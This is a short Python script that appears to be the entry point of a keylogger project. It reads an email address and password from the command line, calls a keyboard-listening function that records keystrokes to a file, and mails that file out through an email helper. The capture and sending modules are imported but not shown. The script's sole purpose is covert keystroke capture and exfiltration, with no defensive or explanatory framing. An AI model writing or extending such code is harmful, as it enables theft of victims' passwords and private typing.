from src.events.email_events import send_email
from src.events.keyboard_events import listen_keyboard
import sys

email, password = sys.argv[1:]

filename = listen_keyboard()
send_email(email, password, filename)